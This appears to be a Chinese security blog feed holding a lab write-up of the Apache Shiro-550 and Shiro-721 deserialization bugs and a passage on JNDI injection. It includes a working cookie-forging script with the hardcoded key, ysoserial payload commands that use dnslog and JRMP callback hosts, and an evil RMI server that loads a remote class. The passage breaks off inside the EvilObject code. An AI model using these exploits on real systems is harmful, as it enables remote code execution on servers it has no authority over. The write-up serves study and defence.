    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h1><p>Apache shiro 是java的一个安全框架，可以帮助完成认证，授权，加密，会话管理等功能。它不跟任何框架或容器绑定，可以独立运行。</p><h2 id="怎么判断是否是shiro网站"><a href="#怎么判断是否是shiro网站" class="headerlink" title="怎么判断是否是shiro网站"></a>怎么判断是否是shiro网站</h2><p>发送cookie带有rememberMe=0的包，若返回包的头部有rememberMe，则为shiro站点</p><h1 id="shiro-550"><a href="#shiro-550" class="headerlink" title="shiro-550"></a>shiro-550</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>当shiro版本小于1.2.5时，主要是由shiro的rememberMe内容反序列化导致的命令执行漏洞，造成的原因是AES密钥被硬编码在shiro源码中，这就导致了可以通过在cookie的rememberMe字段插入payload实现任意代码执行</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>git clone <a href="https://github.com/apache/shiro.git">https://github.com/apache/shiro.git</a> 下载shiro</p><p>然后 git checkout shiro-root-1.2.4,切换到1.2.4版本进行对应版本的漏洞调试</p><p>编辑shiro/samples/web/pom.xml文件，在此处加入 <version>1.2</version> </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309141612431.png" alt="image-20210309141612431"></p><p>然后idea打开shiro/samples/web 下的pom.xml,然后Run -&gt; Edit Configurations 添加TomcatServer</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309142858354.png" alt="image-20210309142858354"></p><p>待idea加载完maven后，向tomcat部署工件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309143500761.png" alt="image-20210309143500761"></p><p>出现以下页面则说明环境搭建成功</p><p><img src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20210309143605131.png" alt="image-20210309143605131"></p><h2 id="开始动调"><a href="#开始动调" class="headerlink" title="开始动调"></a>开始动调</h2><h3 id="序列化，加密"><a href="#序列化，加密" class="headerlink" title="序列化，加密"></a>序列化，加密</h3><p>在org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin 处下断点<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309144449196.png" alt="image-20210309144449196"></p><p>然后进入shiro登陆页面，勾选<em>rememberme</em>，进行登录，断点命中</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309144539506.png" alt="image-20210309144539506"></p><p>然后会校验token里面的rememberme是否为true，若为true则执行rememberIdentity函数</p><p>我们跟进rememberIdentity函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309145259149.png" alt="image-20210309145259149"></p><p>发现principals变量获取了需要remember的用户名（此处为root），然后再调用重载函数rememberIdentity。<br>这个函数调用了convertPrincipalsToBytes,我们跟进看看这个函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309145901675.png" alt="image-20210309145901675"></p><p>可以发现对传入的principals调用了serialize方法，继续跟进serialize方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309150019544.png" alt="image-20210309150019544"></p><p>继续跟进serialize会来到这个地方</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309150133277.png" alt="image-20210309150133277"></p><p>发现就是对其调用了writeObject()这个原生反序列方法而已，没什么好康的，转回头去看看convertPrincipalsToBytes那个加密函数encrypt</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309152804516.png" alt="image-20210309152804516"></p><p>发现通过getCipherService方法返回了一个东西，发现是加密方式等东西</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309153312468.png" alt="image-20210309153312468"></p><p>在此处156行会调用另一个encrypt方法，其中第一个参数是序列化后的用户名，第二个参数则是密钥（这个密钥是硬编码写入文件的，所以造成了安全问题）我们跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309154512813.png" alt="image-20210309154512813"></p><p>这里的ivBytes是一个随机生成的iv（我没跟进细看),然后在这个方法最后它调用了encrypt的重载函数，并传入了序列化后的用户名，key，iv，以及一个true。我们继续跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155203309.png" alt="image-20210309155203309"></p><p>可以发现通过arraycopy，把iv和加密后的密文数据（aes）放入了output,最后返回了output. 然后这个return会一直返回到此处</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155606194.png" alt="image-20210309155606194"></p><p>output的内容作为参数传入了rememberSerializedIdentity，跟进该函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155736406.png" alt="image-20210309155736406"></p><p>56行，把base64加密后的output作为值写入到cookie中的remembername键</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309162524164.png" alt="image-20210309162524164"></p><p>57行将其返回给客户端</p><p>burp抓包发现事实确实如此</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309162406182.png" alt="image-20210309162406182"></p><p>另外说一下那个硬编码key，那个硬编码的key在AbstractRememberMeManager.class DEFAULT_CIPHER_KEY_BYTES里</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309163021784.png" alt="image-20210309163021784"></p><p>可以发现通过getEncryptionCipherKey获得的key确实是DEFAULT_CIPHER_KEY_BYTES</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309164110278.png" alt="image-20210309164110278"></p><p>我们简要的梳理一下这个流程， 当我们勾选rememberme后，用户名会被序列化处理，然后与硬编码的key，随机生成的iv一起进行加密，然后以 iv+密文 的base64编码返回给用户的键为rememberme的cookie里。</p><h3 id="反序列化，解密"><a href="#反序列化，解密" class="headerlink" title="反序列化，解密"></a>反序列化，解密</h3><p>在我们勾选rememberme登陆后，刷新，抓包，将其JSESSIONID删除，使shiro验证cookie中rememberme的值是否正确（如果不删除JSESSIONID，shiro则直接以JSESSIONID为登陆凭证了，就不会验证rememberme中的值了）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213036364.png" alt="image-20210309213036364"></p><p>在org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity 打下断点，放包，断点命中。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213222271.png" alt="image-20210309213222271"></p><p>跟进getRememberedPrincipals方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213255317.png" alt="image-20210309213255317"></p><p>随后再跟进getRememberedSerializedIdentity</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213345511.png" alt="image-20210309213345511"></p><p>关注这里的86行，此处的意思是从cookie中获得base64编码后的cookie值，随后在90行对其进行填充（CBC加密中的一个流程），95行进行base64解码，并将其返回</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214329614.png" alt="image-20210309214329614"></p><p>随后我们回到getRememberedPrincipals方法，跟进其convertBytesToPrincipals方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214559031.png" alt="image-20210309214559031"></p><p>发现其中有个decrypt方法，这里的decrypt方法就是对其行aes解密，取前十六位为IV。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214846036.png" alt="image-20210309214846036"></p><p>下面140行则是对其进行反序列化处理了。我们跟进一下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214941029.png" alt="image-20210309214941029"></p><p>再次跟进deserialize方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309215227753.png" alt="image-20210309215227753"></p><p>看到readObject,就意味着反序列化流程结束了。</p><p>梳理一下，cookie中remenber值传入后先base64解码，然后aes解密，然后反序列化。</p><h3 id="解密，重写cookie，以写入payload"><a href="#解密，重写cookie，以写入payload" class="headerlink" title="解密，重写cookie，以写入payload"></a>解密，重写cookie，以写入payload</h3><p>既然key是固定的，我们知道了key是什么，同时在CBC解密的时候，IV的作用只是作为第一个区块去解密第二个区块（生成的结果去解密第三个区块，以此类推），所以IV可以为随机值没什么特别要求（只要能解密就行了）那么我们就可以自己伪造一个cookie。</p><p>python脚本如下(嫖的笑师傅的)，序列化payload用base64格式传入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pip install pycrypto</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">from random import Random</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">key  &#x3D;  &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">mode &#x3D;  AES.MODE_CBC</span><br><span class="line">IV   &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, IV)</span><br><span class="line"></span><br><span class="line">payload&#x3D;base64.b64decode(sys.argv[1])</span><br><span class="line">BS   &#x3D; AES.block_size</span><br><span class="line">pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">payload&#x3D;pad(payload)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(IV + encryptor.encrypt(payload)))</span><br></pre></td></tr></table></figure><p>然后我们只需要传入base64编码的，去除换行符的payload即可。</p><p>像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;cao.7squwf.dnslog.cn&quot; |base64|sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><h4 id="密钥获取"><a href="#密钥获取" class="headerlink" title="密钥获取"></a>密钥获取</h4><p>有些时候key并不是一成不变的kPH+bIxk5D2deZiIxcaaaA==，而有可能是其他值，我们可以用工具<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a> 来爆破出密钥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 </span><br></pre></td></tr></table></figure><p>即可开始爆破，当然这个工具的作用不仅仅如此</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310132845771.png" alt="image-20210310132845771"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>这个链其实根本没啥危害..只是拿来测试一下有没有洞</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;cao.7squwf.dnslog.cn&quot; |base64|sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><p>生成payload，像cookie伪造脚本传入，获得伪造的cookie</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310115008147.png" alt="image-20210310115008147"></p><p>rememberme登陆后，刷新抓包，删除cookie中的session，替换cookie中的rememberme为伪造后的cookie。放包,DNSLOG有反应</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310115425170.png" alt="image-20210310115425170"></p><h3 id="cc链"><a href="#cc链" class="headerlink" title="cc链"></a>cc链</h3><h5 id="cc链2"><a href="#cc链2" class="headerlink" title="cc链2"></a>cc链2</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar CommonsCollections2 &quot;calc&quot;|base64 |sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><p>然后制作cookie，发过去，成功弹计算器</p><h5 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h5><p>通过运行mvn dependency:list 命令可以发现当前Commons Collections 的版本是3.2.1</p><p>按理说会有cc链5，但是实际上用ysoserial 生成payload用上面的方法打过去后没有反应。看别人博客发现是这个原因 “Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。” 解决这种问题的办法是用JRMP</p><p>vps上执行以下命令，监听端口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12006 CommonsCollections5 &#39;calc&#39;</span><br></pre></td></tr></table></figure><p>我们再通过ysoserial生成payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar JRMPClient &#39;vps_ip:12006&#39;|base64|sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><p>然后伪造cookie，发过去，成功弹计算器</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310194746492.png" alt="image-20210310194746492"></p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>这个洞因为cookie中的值使用硬编码的key加密而成，我们可以以此来伪造cookie，顺便在cookie里写入危险的paylaod如cc链payload，使cookie中的值被解密，随后经历反序列化，造成命令执行</p><p>参考：<a href="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a> 笑师傅大大</p><h1 id="shiro-721"><a href="#shiro-721" class="headerlink" title="shiro-721"></a>shiro-721</h1><p>去年学的Padding Oracle 在此处被利用了起来。可以先看看Padding Oracle Attack 大概是个啥<a href="https://const27.com/2021/02/19/Padding%20oracle%20Attack%E4%B8%8ECBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/">https://const27.com/2021/02/19/Padding%20oracle%20Attack%E4%B8%8ECBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/</a></p><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.2.5, </span><br><span class="line">1.2.6, </span><br><span class="line">1.3.0, </span><br><span class="line">1.3.1, </span><br><span class="line">1.3.2, </span><br><span class="line">1.4.0-RC2, </span><br><span class="line">1.4.0, </span><br><span class="line">1.4.1</span><br></pre></td></tr></table></figure><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>其实漏洞代码层面逻辑上和shiro-550大致相似，只不过key没有硬编码进代码中了。<br>但是只要我们获得一个rememberme用户的cookie后就可以通过padding oracle attack 伪造任意cookie发过去了，从而造成反序列化漏洞了</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在这里下载1.4.1的war包<a href="https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war%EF%BC%8C%E5%B9%B6%E6%94%BE%E5%85%A5tomcat">https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war，并放入tomcat</a> webapps文件夹，随后启动tomcat，访问<a href="http://127.0.0.1:8080/samples-web-1.4.1/">http://127.0.0.1:8080/samples-web-1.4.1/</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310220716846.png" alt="image-20210310220716846"></p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>大致逻辑与shiro-550差不多，直接说利用吧。</p><p><a href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a> 使用这个工具</p><p>首先我们得勾选rememberme，抓包获得rememberme cookie</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310221230268.png" alt="image-20210310221230268"></p><p>然后通过ysoserial生成payload，将其通过管道符传入某个文件，随后用刚刚那个工具里的shiro_exp.py</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .&#x2F;shiro_exp.py &lt;url&gt; &lt;cookie&gt; &lt;paylaod文件&gt;</span><br></pre></td></tr></table></figure><p>随后会进行爆破，最后获得结果cookie后，传入并发包过去即可（爆破时间很长）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310224415067.png" alt="image-20210310224415067"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;shiro&quot;&gt;&lt;a href=&quot;#shiro&quot; class=&quot;headerlink&quot; title=&quot;shiro&quot;&gt;&lt;/a&gt;shiro&lt;/h1&gt;&lt;p</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JNDI注入原理浅析</title>
    <link href="http://const27.com/2021/06/28/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    <id>http://const27.com/2021/06/28/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</id>
    <published>2021-06-28T13:51:11.045Z</published>
    <updated>2021-06-28T13:50:45.147Z</updated>
    
    <content type="html"><![CDATA[<p>JNDI注入依赖RMI，所以在学习JNDI注入前务必了解一下RMI</p><h1 id="JNDI-简介"><a href="#JNDI-简介" class="headerlink" title="JNDI 简介"></a>JNDI 简介</h1><p>JNDI (Java Naming and Directory Interface) 是一个java中的技术，用于提供一个访问各种资源的接口。比如通过JNDI可以在局域网上定位一台打印机，或者定位数据库服务，远程JAVA对象等。<br>JNDI底层支持RMI远程对象，RMI注册的服务可以直接被JNDI接口访问调用。</p><h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><h2 id="RMI工作原理"><a href="#RMI工作原理" class="headerlink" title="RMI工作原理"></a>RMI工作原理</h2><p>首先我们先思考一下RMI的工作原理是什么。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.服务器创建好继承于Remote接口的类，并把它绑定到RMI服务器上</span><br><span class="line">2.客户端请求RMI服务器上的类</span><br><span class="line">3.服务端返回客户端所请求类的存根stub，客户端将这个stub看作实例化对象使用</span><br><span class="line">4.客户端调用stub的某个方法，并传入参数。该参数会发送到RMI服务器上，由RMI服务器按照客户端传来的参数来执行指定的方法</span><br><span class="line">5.服务器执行完后将结果返回给客户端</span><br></pre></td></tr></table></figure><p>所以从RMI这一端来看，客户端获取了远程对象后所执行的此对象的方法，都是由RMI服务器来执行的。</p><h2 id="JNDI-与-RMI-的区别"><a href="#JNDI-与-RMI-的区别" class="headerlink" title="JNDI 与 RMI 的区别"></a>JNDI 与 RMI 的区别</h2><p>rmi调用远程对象和JNDI调用远程对象，在代码上是有差别的</p><p>如下是RMI创建和调用远程对象</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">import java.util.Properties;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">interface IHello extends Remote &#123;</span><br><span class="line">    public String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line">class IHelloImpl extends UnicastRemoteObject implements IHello &#123;</span><br><span class="line">    protected IHelloImpl() throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">    public String sayHello(String name) throws RemoteException &#123;</span><br><span class="line">        return &quot;Hello &quot; + name + &quot; ^_^ &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class CallService &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line">        IHello hello &#x3D; new IHelloImpl();</span><br><span class="line">        Naming.bind(&quot;hello&quot;, hello);</span><br><span class="line">        </span><br><span class="line">        IHello rHello &#x3D; (IHello) Naming.lookup(&quot;hello&quot;);</span><br><span class="line">        System.out.println(rHello.sayHello(&quot;RickGray&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而JNDI调用远程对象的过程如下，多了一步设置JNDI环境</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">import java.util.Properties;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">interface IHello extends Remote &#123;</span><br><span class="line">    public String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line">class IHelloImpl extends UnicastRemoteObject implements IHello &#123;</span><br><span class="line">    protected IHelloImpl() throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">    public String sayHello(String name) throws RemoteException &#123;</span><br><span class="line">        return &quot;Hello &quot; + name + &quot; ^_^ &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class CallService &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; 配置 JNDI 默认设置</span><br><span class="line">        Properties env &#x3D; new Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">        env.put(Context.PROVIDER_URL,</span><br><span class="line">                &quot;rmi:&#x2F;&#x2F;localhost:1022&quot;);</span><br><span class="line">        Context ctx &#x3D; new InitialContext(env);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 本地开启 1022 端口作为 RMI 服务，并以标识 &quot;hello&quot; 绑定方法对象</span><br><span class="line">        Registry registry &#x3D; LocateRegistry.createRegistry(1022);</span><br><span class="line">        IHello hello &#x3D; new IHelloImpl();</span><br><span class="line">        registry.bind(&quot;hello&quot;, hello);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; JNDI 获取 RMI 上的方法对象并进行调用</span><br><span class="line">        IHello rHello &#x3D; (IHello) ctx.lookup(&quot;hello&quot;);</span><br><span class="line">        System.out.println(rHello.sayHello(&quot;tom&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h2><p>首先来看一下如何创建一个对象Reference并将其绑定到RMI服务器上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">......定义好了registry，它是一个Registry对象（RMI中用于将类注册到服务器上的对象）</span><br><span class="line">Reference refObj &#x3D; new Reference(&quot;refClassName&quot;, &quot;insClassName&quot;, &quot;http:&#x2F;&#x2F;a.com:12345&quot;);</span><br><span class="line">ReferenceWrapper refObjWrapper &#x3D; new ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(&quot;refObj&quot;, refObjWrapper);</span><br></pre></td></tr></table></figure><p>前面说到RMI服务器会向客户端返回stub或者说一个对象，如果RMI服务器传回客户端一个Reference对象呢？那就要说道说道了。<br>对于RMI服务器而言，向客户端传回一个Reference对象和传回其他对象一样，并没有多大区别。<br>但是客户端由于获取到了一个Reference实例，比如说就是上面代码中的Reference实例，接下来客户端就会先在CLASSPATH里寻找被标识为refClassName的类。如果没找到，它就会去请求<a href="http://a.com:12345/refClassName.class">http://a.com:12345/refClassName.class</a> 对里面的类进行动态加载，并调用insClassName类的构造方法。注意，调用insClassName类的构造方法这个行为是由客户端完成的。</p><p>上面的一系列行为可以概括为xiatu<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210324014723682.png" alt="image-20210324014723682"></p><h2 id="JNDI-协议转换"><a href="#JNDI-协议转换" class="headerlink" title="JNDI 协议转换"></a>JNDI 协议转换</h2><p>我们在通过JNDI调用远程对象时，需要设置环境，就像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Properties env &#x3D; new Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">        &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);  &#x2F;&#x2F;设置了rmi请求方式</span><br><span class="line">env.put(Context.PROVIDER_URL,</span><br><span class="line">        &quot;rmi:&#x2F;&#x2F;localhost:1099&quot;);</span><br><span class="line">Context ctx &#x3D; new InitialContext(env);</span><br></pre></td></tr></table></figure><p>比如以上代码，就设置了JNDI会通过rmi的方式去请求远程对象。</p><p>但是当调用lookup()或者search()时，可以直接无视环境是如何设置请求方式的，因为JNDI有协议动态转换机制。什么意思呢？看看代码就晓得了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Properties env &#x3D; new Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">        &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">env.put(Context.PROVIDER_URL,</span><br><span class="line">        &quot;rmi:&#x2F;&#x2F;localhost:1099&quot;);</span><br><span class="line">Context ctx &#x3D; new InitialContext(env);</span><br><span class="line">ctx.lookup(&quot;ldap:&#x2F;&#x2F;a.com&#x2F;ou&#x3D;foo,dc&#x3D;foobar,dc&#x3D;com&quot;)</span><br></pre></td></tr></table></figure><p>以上代码执行后，会调用ldap协议去请求，而不是rmi。<br>这是因为lookup或者search函数在参数为绝对路径URI的情况下动态转换协议为参数中指定的协议。</p><h2 id="JNDI注入-1"><a href="#JNDI注入-1" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>如果我们满足以下条件，JNDI注入就会成功</p><p>JNDI调用的lookup参数可控<br>URI可进行动态协议转换<br>Reference对象指定类会被加载并实例化</p><p>其实最重要的就是第一条。</p><p>下面用一张图概括从JNDI注入到RCE的流程</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210324141937091.png" alt="image-20210324141937091"></p><p>1.攻击者控制了lookup参数<br>2.攻击者将lookup参数替换为去请求恶意服务器A上的Reference对象<br>3.恶意服务器A返回Reference对象<br>4.受害机器获得Reference对象后先在CLASSPATH中查找Reference对象中的指定类是否存在，若不存在则请求Reference对象中指定的恶意服务器B去获得指定类<br>5.恶意服务器B返回指定类<br>6.受害机器得到指定类后，执行指定类的构造函数，从而达到RCE</p><p>下面是代码实现</p><p>受害机器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">interface IHello extends Remote &#123;</span><br><span class="line">    abstract String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line">public class CallService &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception&#123;</span><br><span class="line">        if(args.length&lt;1)&#123;</span><br><span class="line">            System.out.println(&quot;Plz input url&quot;);</span><br><span class="line">            System.exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; JNDI 获取 RMI 上的方法对象并进行调用</span><br><span class="line">            Context ctx &#x3D; new InitialContext();</span><br><span class="line">            IHello rHello &#x3D; (IHello) ctx.lookup((String)args[0]);</span><br><span class="line">            System.out.println(rHello.sayHello(&quot;tom&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMI</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.*;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class evilrmi &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Registry registry &#x3D; LocateRegistry.createRegistry(1010);</span><br><span class="line">        Reference refObj &#x3D; new Reference(&quot;EvilObject&quot;,&quot;EvilObject&quot;,&quot;http:&#x2F;&#x2F;192.168.111.1:80&#x2F;&quot;);</span><br><span class="line">        ReferenceWrapper refObjWra &#x3D; new ReferenceWrapper(refObj);</span><br><span class="line">        registry.bind(&quot;refObj&quot;,refObjWra);</span><br><span class="line">        System.out.println(&quot;gogo&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>EvilObject</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class EvilObject &#123;</span><br><span class="line">    public EvilObject() throws Exception &#123;</span><br><span class="line">        Runtime rt &#x3D; 